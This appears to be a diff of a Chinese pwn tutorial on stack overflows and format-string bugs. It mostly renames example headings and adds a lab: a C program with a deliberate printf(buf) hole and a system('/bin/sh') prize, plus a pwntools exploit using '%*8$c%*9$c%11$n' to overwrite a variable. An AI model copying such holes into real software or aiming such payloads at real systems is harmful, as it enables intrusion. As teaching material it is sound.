@@ -200,7 +200,7 @@ ELF 文件中通常存在 .GOT.PLT 和 .PLT 这两个特殊的节，ELF 编译�
 
 x86 架构中一般使用指令 call 调用一个函数，并使用指令 ret 返回。CPU 在执行 call 指令时，会先将当前 call 指令的下一条指令的地址入栈，再跳转到被调用函数。当被调用函数需要返回时，只需要执行 ret 指令，CPU 会将栈顶地址出栈，并赋值给 EIP 寄存器。
 
-#### 示例-3.1.1：简单栈溢出
+#### 示例：简单栈溢出
 
 ```
 #include<stdio.h>
@@ -269,7 +269,7 @@ p.interactive()	# 切换到直接交互模式
 
 运行脚本，成功获得 shell。
 
-#### 示例-3.1.2：2023网鼎杯pwn16
+#### 示例：2023网鼎杯pwn16
 
 打开题目，F5 反编译，跟进函数 `overflow_()`。
 
@@ -313,9 +313,9 @@ p.interactive()
 
 Canary 机制在栈保存 RBP 的位置前插入一段随机数，如果攻击者利用栈溢出漏洞覆盖返回地址，会将 Canary 一起覆盖。编译器会在函数 ret 指令前添加一段检查 Canary 值是否 被改写的代码。如果被改写，则直接抛出异常，中断程序，从而阻止攻击发生。
 
-但 Canary 机制不一定可靠，例如示例 2.3.2.1。
+但 Canary 机制不一定可靠，示例如下。
 
-#### 示例-3.2.1：Canary机制
+#### 示例：Canary机制
 
 ```c
 #include<stdio.h>
@@ -1124,7 +1124,7 @@ int main()
 
 由于 `%n` 可以将已经成功输出的字符个数写入对应的整形指针参数所指的变量，因此可以事先再在栈上布置想要写入的内存的地址。再通过 `%Yc%X$n`（Y 为想要写入的数据）就可以进行任意内存写。
 
-#### 示例-5.3.1：格式化字符串漏洞基本利用
+#### 示例：格式化字符串漏洞基本利用
 
 ```c
 #include<stdio.h>
@@ -1265,11 +1265,74 @@ p.interactive()
 
 ### 5.5 一些特殊用法
 
-格式化字符串有时会遇到一些比较少见的占位符，如 `*` 表示取对应函数参数的值来作为宽度
+格式化字符串有时会遇到一些比较少见的占位符，如 `*` 表示取对应函数参数的值来作为宽度，`printf("%*d",3,1)` 输出 “  1”，1 的前面有两个占位符。
+
+#### 示例：格式化字符串特殊用法
+
+```c
+#include<stdio.h>
+#include<unistd.h>
+#include<fcntl.h>
+
+int main() {
+    char buf[100];
+    long long a=0;
+    long long b=0;
+    int fp = open("/dev/urandom",O_RDONLY);
+    read(fp, &a, 2);
+    read(fp, &b, 2);
+    close(fp);
+    
+    long long num;
+    puts("your name:");
+    read(0, buf, 100);
+    puts("input a number to get a gift:");
+
+    long long *num_ptr = &num;
+    scanf("%lld", num_ptr);
+    printf("hello ");
+    printf(buf);
+    printf("let me see ...");
+    if(a+b == num) {
+        puts("you win, I will give you a shell!");
+        system("/bin/sh");
+    }
+    else {
+        puts("try again");
+        exit(0);
+    }
+}
+```
+
+在以上示例中，猜测两个数的和，猜对后得到 shell。不考虑爆破的情况，虽然格式化字符串可以泄露这两个数的值，但是输入是在泄露前，泄露后已经无法修改猜测的值，所以需要直接向 num 中填入 a 与 b 的值。此时需要用到占位符 `*`。
+
+在 `printf(buf)` 处设置断点，a、b 两个数在第 8、9 个参数位置（f恩别为 0x1b2d、0xc8e3）， num_ptr 在第 11 个参数位置。a、b 两个数作为两个输出宽度，输出的字符就是 a、b 之和，再用 `%n` 写入 num 中，即可达到 num==a+b 的效果。
+
+![image-20230509101438266](images/image-20230509101438266.png)
+
+利用脚本如下：
+
+```python
+from pwn import *
+payload = "%*8$c%*9$c%11$n"
+p=process("./fsb3")
+p.recvuntil("name")
+p.sendline(payload)
+p.recvuntil("gift")
+p.sendline("1")
+p.interactive()
+```
 
 ### 5.6 总结
 
-（待补）
+格式化字符串利用的本质是任意地址的读写。
+
+有时候程序会开启 Fortify 保护机制，这样程序在编译时，所有的 `printf()` 都会被 `__printf_chk()` 替换。两者之间的区别如下：
+
+- 当使用位置参数时，必须使用范围内的所有参数，不能使用位置参数不连续地打印。例如，要使用 `%3$x`，必须同时使用 `%1$x` 和 `%2$x`。
+- 包含 `%n` 的格式化字符串不能位于内存中的可写地址。
+
+这时虽然任意地址写很难，但可以利用任意地址读进行信息泄露，配合其他漏洞使用。
 
 ## 第 6 章 堆利用
 
